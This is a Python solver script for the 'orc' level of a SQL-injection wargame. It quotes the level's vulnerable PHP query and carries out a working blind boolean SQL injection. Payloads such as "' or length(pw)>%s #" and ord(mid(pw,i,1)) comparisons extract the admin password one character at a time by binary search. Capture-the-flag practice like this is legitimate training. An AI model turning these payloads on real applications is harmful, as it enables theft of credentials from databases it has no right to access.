#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def check_func(response: str) -> bool:
    return 'Hello admin' in response


def main():
    '''
    Orc

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello admin</h2>"; 

    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
    '''

    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    payload = "' or length(pw)>%s #"
    param = dict(pw=payload)
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        payload = f"' or id='admin' and ord(mid(pw,{i},1))<%s #"
        param = dict(pw=payload)
        left, num_requests = los.find_binary(url, param, check_func,
                                             32, 127, cook)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)

    print(result)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('ORC Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
